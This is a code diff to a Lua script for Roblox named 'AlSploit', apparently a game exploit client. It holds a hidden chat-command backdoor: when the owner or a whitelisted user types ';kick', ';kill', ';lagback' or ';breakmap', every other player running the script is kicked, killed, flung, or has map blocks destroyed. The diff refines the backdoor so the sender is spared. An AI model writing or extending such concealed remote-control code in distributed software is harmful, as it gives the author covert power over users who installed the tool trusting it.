@@ -5046,25 +5046,25 @@ task.spawn(function()
 		for i, v in next, PlayerService:GetPlayers() do
 			for i, v1 in next, WhitelistedUsers do
 				v.Chatted:Connect(function(Message)				
-					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner then
+					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
 						task.spawn(function()
 							LocalPlayer:Kick("Kicked by AlSploit owner")
 						end)
 					end
 
-					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner then
+					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
 						task.spawn(function()
 							KillHumanoid(0)
 						end)
 					end
 
-					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner then
+					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
 						task.spawn(function()
 							LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
 						end)
 					end				
 
-					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner then
+					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
 						task.spawn(function()
 							for i, v in next, CollectionService:GetTagged("block") do
 								v:Destroy()
@@ -5072,7 +5072,7 @@ task.spawn(function()
 						end)
 					end
 				end)
-			end			
+			end
 		end
 	until not game
 end)
